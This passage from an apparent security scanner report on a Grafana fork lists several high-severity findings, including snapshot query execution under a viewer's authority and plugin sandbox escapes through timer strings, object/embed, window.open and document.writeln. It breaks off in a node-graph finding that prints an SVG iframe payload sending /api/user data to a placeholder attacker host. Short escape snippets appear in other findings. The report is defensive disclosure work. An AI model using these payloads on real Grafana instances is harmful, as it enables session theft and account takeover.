## Reproduction steps
1. Attacker: any authenticated user holding snapshots:create (per the recorded threat model the Viewer basic role; unauthenticated only under the non-default [snapshots] public_mode=true, not counted here). They POST a crafted dashboard body to /api/snapshots (SnapshotSrv.create is a thin wrapper) and send /dashboard/snapshot/<key> to a higher-privileged user. The victim merely opens the link; the scene builder creates live SceneQueryRunners from the stored targets and runs them with the victim's session. No datasource UID knowledge is required (uid-less refs resolve to the victim's default datasource). Works in default configuration with snapshots enabled; no defensive mechanism stands on the path.

## Recommended fix
1. The snapshot scene builder (transformSaveModelToScene/createSceneObjectsForPanels -> buildGridItemForPanel -> createPanelDataProvider) treats snapshot panels like live dashboard panels and creates query runners from stored datasource/targets, so content authored by a snapshots:create holder executes with each viewer's datasource authority — unlike variables, annotations and actions, which the builder already neutralises in snapshot mode. Fix criteria: When meta.isSnapshot is set, panels must only render embedded snapshot data: any target whose datasource is not the grafana datasource or whose queryType is not 'snapshot' must be dropped (or replaced with an empty result) before a query runner is created — for grid panels, collapsed-row panels, repeated panels and library panels alike, in both the v1 and v2 snapshot loaders. Verify by storing a snapshot body with a live datasource/target via the API and confirming that opening /dashboard/snapshot/<key> issues no /api/ds/query or datasource resource request.
2. Scrubbing of snapshot bodies is performed only in the author's browser (trimDashboardForSnapshot / vizPanelDataToPanel), so the stored body is untrusted input to every viewer. Fix criteria: Snapshot creation should not rely on client-side trimming alone; the stored body should be validated/normalised so that only grafana snapshot-type targets survive (server-side, outside this checkout's scope). Verify by submitting a body with live targets and reading it back.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-441](https://cwe.mitre.org/data/definitions/441.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256417

---

# Sandbox leaves host setTimeout/setInterval undistorted; string arguments compile in the host realm

## Details
The frontend plugin sandbox (public/app/features/plugins/sandbox) runs a plugin's module.js in a near-membrane child realm and relies on distortions to keep plugin code from executing in the host (blue) realm. The documented guarantee (docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) is that sandboxed plugins cannot modify global browser objects, core Grafana features or other plugins, and the feature is recommended for 'plugins from untrusted sources' and for panels that let users write JavaScript.

near-membrane-dom (recovered from the shipped source map public/build/pluginSandbox.76f7fda88ac9b9530e06.js.map; no package manifest is in the checkout, so the version is unpinned here) installs the red realm's global by lazily remapping every own property of the iframe window except document/location/top/window onto the blue window through the membrane. `setTimeout` and `setInterval` are Window own properties and are not among the keys the library keeps realm-local (getESGlobalKeys / ReflectiveIntrinsicObjectNames list `eval` and `Function`, which is why `eval`/`new Function` stay red), so in the red realm `setTimeout` is a proxy of the host's `setTimeout`. On first access activateLazyOwnPropertyDefinition fetches the blue descriptor, whose value passes through Grafana's distortionCallback (sandboxPluginLoader.ts:65-87): it is not a DOM element and is not a key of generalDistortionMap (distortions.ts:72-89), so the original host function is returned. The membrane's apply trap forwards primitive arguments verbatim and callableApply performs ReflectApply(hostSetTimeout, thisArg, args). A sandboxed plugin that calls `setTimeout('<code>', 0)` or `setInterval('<code>', 1)` (a bare call, so `this` is undefined and WebIDL binds the host Window) therefore has the host realm compile and execute `<code>` as a classic timer-string script with the host `window` as its global - outside the membrane, with direct access to the real `document` (no element mocking), `window.grafanaBootData`, script-readable storage, `fetch`/XHR with the user's session cookie, core Grafana modules and every other plugin's objects. The textual rewrite in codeLoader.ts (`window.location` -> `window.locationSandbox`) does not touch timers.

Grafana's own code reproduces the same sink: the `setImmediate` endowment at sandboxPluginLoader.ts:103-105 passes the plugin-supplied first argument into the host realm's `setTimeout`, so `setImmediate('<code>')` escapes even if near-membrane's remapping were tightened. Nothing downstream blocks the string: conf/defaults.ini ships content_security_policy = false, and the shipped content_security_policy_template includes 'unsafe-eval', which is what permits string timer handlers; the Trusted Types default policy (trustedTypePolicies.ts:14) has a pass-through `createScript`.

Attack path: the author of a third-party (or compromised/auto-updated) plugin whose id the operator has placed in `security.enable_frontend_sandbox_for_plugins`, or an Editor writing JavaScript into a sandboxed user-JS panel that evaluates it in the red realm, ships code containing a single timer call with a string body. Every signed-in user whose page renders the plugin (app plugins may `preload` on every page) executes attacker code in the host realm: read any API with the victim's session, rewrite the Grafana UI (credential capture on login/admin forms), act as the victim via backendSrv, tamper with other plugins. No user interaction beyond viewing a page is required.

This is distinct from the verified sandbox findings (append/insert/innerHTML/setAttribute DOM injection, document.writeln/open, locationSandbox javascript: navigation, SRI): it needs no DOM write or navigation and is a pure JavaScript-level escape through an undistorted host function. Assumptions: (1) near-membrane behaves as the shipped source map shows (lazy remap of all non-intrinsic window keys, primitives crossing the apply trap untouched); (2) per the HTML timer initialization steps, browsers compile a string handler in the realm of the global on which setTimeout/setInterval was invoked.

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:72–88](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L72-L88)
   getGeneralSandboxDistortionMap is the complete set of static distortions (iframe attrs, console, alert, append, insert, innerHTML, createElement, workers, document, monaco, postMessage, lodash). No entry is keyed on window.setTimeout or window.setInterval, so distortionCallback returns the real host functions to the red realm. This is where a distortion that rejects or re-realms string handlers must be added.
2. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:103–105](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L103-L105)
   Grafana's own setImmediate endowment forwards the plugin-supplied first argument straight to the host realm's setTimeout: `setImmediate: function (fn, ...args) { return setTimeout(fn, 0, ...args) }`. Endowments are blue functions remapped into the red global, so a string passed as `fn` reaches host setTimeout verbatim and is compiled in the host realm regardless of how near-membrane remaps window keys.
3. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–94](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L94)
   distortionCallback is the only interception point for host values crossing into the red realm; for a function that is not a DOM element and not in generalDistortionMap (and for which distortLiveApis returns undefined) it returns originalValue unchanged. createVirtualEnvironment(window, ...) is passed without globalObjectShape or maxPerfMode, so near-membrane-dom (recovered from public/build/pluginSandbox.76f7fda88ac9b9530e06.js.map) lazily remaps every own key of the iframe window except document/location/top/window and the ES intrinsics/reflectives (getESGlobalKeys + ReflectiveIntrinsicObjectNames, which list eval and Function but not the timers) onto the blue window; red `setTimeout`/`setInterval` are therefore membrane proxies of the host functions, and the membrane's apply trap forwards string and number arguments as primitives without transformation.
4. [public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts:77–79](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts#L77-L79)
   isPluginFrontendSandboxEnabled: a plugin is loaded in the sandbox exactly when its id is listed in config.enableFrontendSandboxForPlugins (security.enable_frontend_sandbox_for_plugins, empty by default). The sandbox is the vulnerable component; the escape is reachable in every deployment that uses it.
5. [public/app/core/trustedTypePolicies.ts:6–21](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/trustedTypePolicies.ts#L6-L21)
   The Trusted Types default policy installed in both realms (passed as defaultPolicy to createVirtualEnvironment) has `createScript: (string) => string`, so even where Trusted Types enforcement is turned on, a string handed to the host setTimeout is accepted as TrustedScript rather than rejected.
6. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production dispatch: when shouldLoadPluginInFrontendSandbox is true the plugin's module is loaded via importPluginModuleInSandbox, so every page rendering such a plugin runs its code behind this membrane.

## Impact
Arbitrary host-realm script in the victim's Grafana origin: read of boot data, script-readable storage and any API response fetched with the victim's session (confidentiality high); arbitrary UI modification, requests made as the victim via fetch/backendSrv, tampering with core Grafana and other plugins (integrity high); the plugin can also break or redirect the application for its viewers (availability low).

## Reproduction steps
1. Attacker is a third-party plugin author (no account on the victim's Grafana; the operator installs and sandboxes the plugin precisely because it is untrusted, the documented use case) or, for user-JS panels that evaluate user code in the red realm, an Editor. Code is delivered over the network to every user whose page renders the plugin; one `setTimeout('...')`/`setInterval('...')`/`setImmediate('...')` call suffices, with no defence to evade: generalDistortionMap has no timer entry, the membrane passes strings verbatim, CSP is off by default and the shipped template allows 'unsafe-eval', and the TT default policy passes script strings. The deployment condition is that the plugin is installed and listed in security.enable_frontend_sandbox_for_plugins - the sandbox is the vulnerable component and is opt-in, hence AT:P. The victim merely views a page. Depends on near-membrane behaving as recovered from the shipped source map (version unpinned in this checkout).

## Recommended fix
1. window.setTimeout and window.setInterval are handed to the red realm as proxies of the host functions, and the host compiles a string first argument in the blue realm; no distortion rejects non-function handlers. Fix criteria: A sandboxed plugin calling setTimeout/setInterval (and any other host function that compiles strings) with a string first argument must have the string rejected or evaluated inside the plugin's own realm; `setTimeout('globalThis.__escaped=1')` from a sandboxed plugin must leave the host window untouched. Verify with a unit test registering the distortion and asserting the host global is not defined.
2. The setImmediate endowment forwards the plugin-supplied handler directly to the blue realm's setTimeout. Fix criteria: setImmediate must only accept callable handlers (throw or ignore otherwise) and must schedule them through the same distorted/safe path as setTimeout, so `setImmediate('<code>')` cannot execute host-realm code.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-749](https://cwe.mitre.org/data/definitions/749.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256408

---

# Sandbox only fences iframes; window.open and object/embed give plugins an unmediated same-origin Window

## Details
The Plugin Frontend Sandbox (docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) promises that a sandboxed plugin cannot modify the Grafana interface outside its area, alter core features or global browser objects, or interfere with other plugins, and is recommended for 'Plugins from untrusted sources' and panels that run Editor-written JavaScript. Its model is that plugin code must never obtain a JavaScript realm that is same-origin with Grafana yet outside the near-membrane. That model is implemented only for <iframe>: forbiddenElements = ['iframe'] (constants.ts), HTMLIFrameElement's contentWindow/contentDocument/src/srcdoc accessors are distorted to throw (distortions.ts:102-134), and near-membrane revokes the proxies of its own sandbox iframe's window and document. Two other sources of a same-origin Window are left unmediated.

1. <object data="about:blank"> / <embed src="about:blank">. document.createElement('object') passes the deny-list (distortions.ts:245) and the detached element is returned unproxied (documentSandbox.ts:158-160); document.body is handed to the red realm by design (documentSandbox.ts:13-19); appendChild/append/insertBefore filter only 'iframe' (distortions.ts:330, 355, 271), so the element is attached to the live document and the browser creates a nested same-origin browsing context whose parent/top is the host window. HTMLObjectElement.prototype.contentWindow (and HTMLEmbedElement's) has no distortion, so the getter returns the nested WindowProxy, which distortionCallback (sandboxPluginLoader.ts:65-87) passes through as a plain membrane proxy. The plugin waits for the element's load event (the object's nested navigable is created asynchronously) and calls obj.contentWindow.eval('<code>') or new (obj.contentWindow.Function)('<code>')(). No user gesture is needed.

2. window.open(). `open` is a Window own property lazily remapped onto the host function; called from a plugin click handler (transient activation belongs to the host document, which received the click) it returns the about:blank popup's WindowProxy, same-origin with `opener` = host window, again crossing as a plain proxy.

In both cases the membrane does not contain the resulting realm. From the @locker/near-membrane source recovered from public/build/pluginSandbox.76f7fda88ac9b9530e06.js.map: linkIntrinsics identity-links only the blue window's own `eval`/`Function` to the red ones (env.link walks blueGlobalThis[key] / redGlobalThis[key]); a popup's or nested window's `eval`/`Function` are distinct objects of a third realm and are wrapped as ordinary function proxies; the blue callableApply performs ReflectApply(func, thisArg, args) with string arguments passed verbatim and no realm check; revokedProxyCallback revokes only near-membrane's own sandbox iframe. w.eval('parent.fetch = ...') therefore runs as an indirect eval inside the nested/auxiliary realm, which holds an unmediated same-origin reference (parent/top/opener) to the host window: it can overwrite host globals and prototypes (fetch, XMLHttpRequest, SystemJS registry) to capture secrets admins type or view, read and rewrite any DOM outside the plugin's wrapper (which the membrane otherwise mocks for elements inside #reactRoot), tamper with other plugins and act as the victim - exactly what the sandbox documentation says it prevents and what a sandboxed plugin is otherwise denied. (window.frames[n] likewise exposes any non-near-membrane frame already present in the page, a lesser corollary.)

Attack path: the author of a third-party plugin whose id the operator placed in security.enable_frontend_sandbox_for_plugins (or an Editor writing JavaScript into a sandboxed user-JS panel) ships a few lines creating an <object> and evaluating code in its contentWindow; every signed-in user whose page renders the plugin is affected. Preconditions: the plugin is sandboxed (only non-Grafana-signed plugins are eligible, sandboxPluginLoaderRegistry.ts:58-72) and CSP is at its shipped default of off (conf/defaults.ini:542) - the template's object-src 'none' would block route 1 only where CSP is opted into and would not affect route 2. This differs from the verified sandbox findings (script/handler insertion into the live document, javascript: navigation via locationSandbox, insertBefore keyed on undefined, document.writeln/open) in that it injects no script into the host document and performs no navigation of it; it obtains a separate same-origin realm, so DOM-insertion and Location fixes do not close it. Dependency assumption: @locker/near-membrane-base/-dom behave as the bundled source shows (version not recoverable from this checkout).

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:102–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L102-L133)
   distortIframeAttributes is the only distortion of nested-browsing-context accessors and it keys on HTMLIFrameElement.prototype alone (contentDocument/contentWindow/src/srcdoc/srcObject/srcset). HTMLObjectElement.prototype.contentWindow/contentDocument, HTMLEmbedElement.prototype, HTMLFrameElement.prototype and the Window own property `open` have no entry in generalDistortionMap, so distortionCallback (sandboxPluginLoader.ts:76-86) hands the red realm the real accessors/functions. This is the code the fix must extend.
2. [public/app/features/plugins/sandbox/constants.ts:1](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/constants.ts#L1)
   forbiddenElements = ['iframe'] is the entire element deny-list consulted by createElement (distortions.ts:245), append/prepend/after/before (330), appendChild (355), insertBefore/replaceChild/insertAdjacentElement (271, 290), innerHTML (195) and getSafeSandboxDomElement (documentSandbox.ts:32). `object`, `embed` and `frame`, which also host a same-origin nested browsing context, pass every check.
3. [public/app/features/plugins/sandbox/distortions.ts:241–263](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L241-L263)
   createElementDistortion returns a DocumentFragment only when the tag is exactly 'iframe'; document.createElement('object') / ('embed') returns a real element. The new, detached element is handed back to the red realm unproxied because isDomElementInsideSandbox treats any node not in the document as inside the sandbox (documentSandbox.ts:158-160).
4. [public/app/features/plugins/sandbox/distortions.ts:350–382](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L350-L382)
   appendChildDistortion rejects only nodeName 'iframe' and diverts 'script'; for an <object data="about:blank"> or <embed src="about:blank"> it calls the original Node.prototype.appendChild on the real target, so the element is attached to the live document and the browser creates a same-origin nested browsing context whose parent/top is the host window.
5. [public/app/features/plugins/sandbox/documentSandbox.ts:13–19](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L13-L19)
   getSafeSandboxDomElement returns the real document.body to the red realm by design, so a sandboxed plugin has a live attachment point for the <object>/<embed> outside its own data-plugin-sandbox wrapper; no DOM write into the host document is otherwise needed.
6. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–94](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L94)
   distortionCallback returns any value that is neither a DOM Element nor a generalDistortionMap key unchanged, so the WindowProxy returned by HTMLObjectElement.contentWindow or window.open(), and that window's `eval`/`Function`, cross into the red realm as ordinary membrane proxies. The membrane is @locker/near-membrane-dom/-base as bundled in public/build/pluginSandbox.76f7fda88ac9b9530e06.js (source recovered from its .map; version string not in the checkout): linkIntrinsics calls env.link('eval') / env.link('Function','prototype'), which walks blueGlobalThis[key] and redGlobalThis[key] and identity-links only those two objects; the blue callableApply does ReflectApply(func, thisArg, args) with primitive arguments passed verbatim and no realm check; revokedProxyCallback revokes only near-membrane's own sandbox-iframe window and document. A third realm's eval is therefore invoked as a plain function and performs an indirect eval in that realm.
7. [public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts:58–71](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts#L58-L71)
   Only plugins that are not Grafana-signed and not internal are sandbox-eligible: the sandbox is applied exactly to code the operator does not trust, which is the attacker position of this finding.
8. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production dispatch: plugins listed in security.enable_frontend_sandbox_for_plugins are loaded through importPluginModuleInSandbox, so every page that renders such a plugin runs its code behind these distortions.
9. [conf/defaults.ini:540–547](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L540-L547)
   content_security_policy = false is the shipped default. The CSP template's `object-src 'none'` would block the <object>/<embed> route only in deployments that opt in to CSP, and would not affect the window.open route at all; the sandbox documentation imposes no CSP obligation on operators who enable it.

## Impact
Arbitrary same-origin script outside the membrane with an unmediated reference to the host window: read of boot data, script-readable cookies and storage, any API response with the victim's session, and DOM the membrane otherwise mocks (other panels, admin forms, one-time tokens) - confidentiality high; overwrite of host globals/prototypes, rewriting of the Grafana UI, requests made as the victim, tampering with core and other plugins - integrity high; the plugin can break or redirect the application for its viewers - availability low.

## Reproduction steps
1. The triggering input is plugin frontend code authored by a third-party plugin developer (no privileges on the victim's Grafana; the operator installs the plugin and sandboxes it because it is untrusted) or by an Editor writing JavaScript into a sandboxed user-JS panel. It is delivered over the network to every user whose page renders the plugin (app plugins may preload on every page). The <object>/<embed> route needs no gesture and no defence to evade in the default deployment (CSP off); the window.open route needs only a click the plugin already handles. The one deployment condition is that the plugin is listed in security.enable_frontend_sandbox_for_plugins - the sandbox is the vulnerable component and is opt-in. The victim merely views a page.

## Recommended fix
1. The element deny-list and the nested-browsing-context accessor distortions cover only <iframe>/HTMLIFrameElement; <object>, <embed>, <frame> and their contentWindow/contentDocument accessors are unmediated. Fix criteria: A sandboxed plugin must be unable to create, attach, or obtain the contentWindow/contentDocument of any element that hosts a nested browsing context (iframe, frame, object, embed, and any future equivalents, matched case-insensitively and via createElementNS). Verify that `document.body.appendChild(document.createElement('object')).contentWindow` from a sandboxed plugin throws or yields no Window.
2. window.open (and frames/indexed window access) return same-origin Window objects whose eval/Function are not realm-linked, so they execute outside the membrane. Fix criteria: window.open from a sandboxed plugin must either be denied, or return a Window whose scripting surface is mediated (e.g. opened with noopener and no returned reference); `frames[n]`/`window[n]` must not expose unmediated same-origin windows. Verify that `open()?.eval` and `frames[0]?.eval` are unavailable to sandboxed code.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-184](https://cwe.mitre.org/data/definitions/184.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256407

---

# Sandbox blocks document.write only; document.writeln/open replace the host document with plugin HTML

## Details
The frontend plugin sandbox (near-membrane) mediates plugin access to host DOM APIs through the distortion map in public/app/features/plugins/sandbox/distortions.ts. distortDocument (lines 439-448) is its protection against a plugin rewriting the host document through the Document stream API, but the deny-list is `['write']`. `Document.prototype.writeln`, `Document.prototype.open` and `Document.prototype.close` are left undistorted, so distortionCallback (sandboxPluginLoader.ts:65-87) returns the real host functions and the membrane proxies them into the red realm.

Because near-membrane-dom links the red `document` to the host document (`env.link('document')`, `remapProto(document, Document.prototype)` in the bundled near-membrane-dom) and getSafeSandboxDomElement returns the real body/head/html elements, `document.writeln('<img src=x onerror="...">')` — or `document.open(); document.writeln('<script>...</script>'); document.close()` — executed by sandboxed plugin code performs an implicit document.open() on the loaded host document, discards the Grafana page and parses attacker markup into the host document. Markup parsed by the document stream executes `<script>` elements and compiles inline event handlers in the host (blue) realm, outside the membrane, with the victim's origin, cookies and session. The plugin can then rebuild any UI (for example a Grafana-looking login page) or exfiltrate via fetch with the victim's session and reload.

The maintainers meant to block this sink (write is blocked; innerHTML/outerHTML/insertAdjacentHTML/DOMParser are filtered), so this is an incomplete deny-list rather than a design choice. The Trusted Types default policy (app/core/trustedTypePolicies.ts) does not help: createHTML only neuters `<script`, not on* attributes, it is only installed when config.trustedTypesDefaultPolicyEnabled, and TT enforcement needs a CSP header that is off by default. This sink is distinct from the node-insertion sinks (append/insertBefore/innerHTML/setAttribute) and the location endowment: the stream API replaces the whole document and runs parser-inserted <script> elements.

The sandbox is a shipped, documented security feature (public preview) that docs/sources/administration/plugin-management/plugin-frontend-sandbox.md recommends for 'plugins from untrusted sources' and 'panel plugins that allow users to write custom JavaScript code'; it is enabled per plugin via security.enable_frontend_sandbox_for_plugins (empty by default), and only applies to non-Grafana-signed plugins (sandboxPluginLoaderRegistry.ts:58-72).

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:439–448](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L439-L448)
   `documentForbiddenMethods = ['write']` is the complete Document-stream deny-list: only Document.prototype.write is mapped to failToSet. Document.prototype.writeln (identical semantics: implicit document.open(), host document replaced by the parsed string, parser-inserted <script> elements and inline handlers execute) and Document.prototype.open/close are never registered in generalDistortionMap. This list is what the fix must complete.
2. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–86](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L86)
   distortionCallback is invoked by near-membrane-base for every blue value crossing into the red realm. writeln is not a DOM element, has no static distortion and no live distortion, so line 86 returns the real host Document.prototype.writeln, which the membrane proxies to the plugin unchanged.
3. [public/app/features/plugins/sandbox/documentSandbox.ts:13–29](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L13-L29)
   The red realm's `document` is the host document: near-membrane-dom (recovered from public/build/pluginSandbox.76f7fda88ac9b9530e06.js.map, index.mjs.js lines 181 `env.link('document')` and 187 `env.remapProto(blueRefs.document, blueRefs.DocumentProto)`) links the red document to the blue one and resolves its methods through the blue Document.prototype proxy. Calling the undistorted writeln with `this` = the red document unwraps to the real host document; getSafeSandboxDomElement likewise hands back the real body/head/documentElement.
4. [public/app/features/plugins/sandbox/distortions.ts:185–238](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L185-L238)
   Sibling string-to-markup sinks (innerHTML, outerHTML, insertAdjacentHTML, DOMParser.parseFromString) are filtered for <iframe and on* handlers, showing the maintainers intend to mediate markup sinks; writeln/open receive no filtering at all and, unlike these, also execute parser-inserted <script> elements.
5. [public/app/core/trustedTypePolicies.ts:6–12](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/trustedTypePolicies.ts#L6-L12)
   The only other control on the write path: the default Trusted Types policy's createHTML rewrites `<script` alone, and is installed only when config.trustedTypesDefaultPolicyEnabled and a CSP enforcing Trusted Types is served (off by default). `<img src=x onerror=...>` written through writeln survives it and its handler compiles in the host realm.
6. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production dispatch: plugins for which shouldLoadPluginInFrontendSandbox is true (non-Grafana-signed and listed in security.enable_frontend_sandbox_for_plugins, conf/defaults.ini:567) are fetched and evaluated through sandboxPluginLoader with the distortion map above.

## Impact
Host-realm script in the victim's Grafana origin: read of session-authenticated API responses, config.bootData, script-readable storage (confidentiality high); arbitrary actions as the victim and arbitrary replacement of the UI including credential capture (integrity high); the host document is destroyed for the viewer until reload (availability low, since the attacker typically restores a working UI).

## Reproduction steps
1. Attacker is the author of a third-party (non-Grafana-signed) plugin bundle that the operator installed and listed in security.enable_frontend_sandbox_for_plugins (conf/defaults.ini:567, empty by default) relying on the sandbox as the docs recommend, or a dashboard Editor whose JavaScript a sandboxed user-JS panel evaluates. The plugin module is fetched over the network and evaluated in the red realm; one `document.writeln('<img src=x onerror=...>')` call reaches the host document undistorted. No shipped defence has to be evaded: CSP is off by default and the TT default policy only rewrites `<script`. The victim merely views a dashboard or page that renders the plugin.

## Recommended fix
The Document stream deny-list in distortDocument lists only `write`; Document.prototype.writeln, open and close reach the host document unfiltered, letting sandboxed plugin code replace the host document with markup whose scripts and handlers run in the host realm. Fix criteria: A sandboxed plugin must not be able to open, write to or close the host document stream by any method or alias: Document.prototype.writeln, open and close must be distorted to fail like write (or the red document must not resolve to the host document for these). Verify by asserting that `document.writeln('<img src=x onerror=...>')` and `document.open()` from a sandboxed plugin throw and leave the host document unchanged.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-184](https://cwe.mitre.org/data/definitions/184.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256406

---

# Node graph icon field renders attacker SVG markup inline, enabling script via iframe srcdoc

## Details
The node graph panel takes the `icon` column of the nodes frame and passes it unmodified to the @grafana/ui `Icon` component (`Node.tsx:165`, value produced at `utils.ts:369`). `Icon` only `console.warn`s on unknown names and builds `src = iconRoot + subDir + '/' + name + '.svg'`, which it hands to react-inlinesvg. react-inlinesvg short-circuits: if `src.includes('<svg')` the string itself is treated as SVG markup, parsed with `DOMParser(..., 'text/html')`, converted to React elements by react-from-dom and rendered.

Because the conversion is attribute-preserving, a value such as

```
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="200" height="200"><iframe srcdoc="&lt;script&gt;fetch('/api/user').then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker/',t))&lt;/script&gt;"></iframe></foreignObject></svg>
```

becomes `React.createElement('iframe', { srcDoc: '<script>...</script>' })`. React 19 blocks `javascript:` URLs and ignores string `on*` props, but `srcdoc` is an ordinary attribute; the resulting about:srcdoc frame inherits the Grafana origin and runs the script with the victim's session (same-origin fetch with cookies, DOM access to the parent, token theft, admin actions if the viewer is an admin). Even without the iframe, arbitrary SVG/HTML (`<a href>`, `<style>`, `<img src=//attacker>`) is injected into the dashboard DOM.

Attacker position: any Editor who can author a dashboard panel and run a query that returns string columns they control. No tracing datasource is required: `getNodeGraphDataFrames` (`utils.ts:586-601`) accepts any frame with an `id` field, and `getGraphFrame` classifies a frame without a `source` field as the nodes frame. Prometheus `label_replace(vector(1),"id","a","","")` chained with `title`/`icon` labels in Table format, Loki `label_format`, any SQL datasource (`SELECT 'a' AS id, '<svg...>' AS icon`), or the bundled TestData 'CSV content' scenario (`public/app/plugins/datasource/grafana-testdata-datasource/QueryEditor.tsx:327`) all suffice. A compromised datasource (threat-model adversary 4) reaches the same sink for every viewer, and in Explore for any frame it marks `preferredVisualisationType: 'nodeGraph'`.

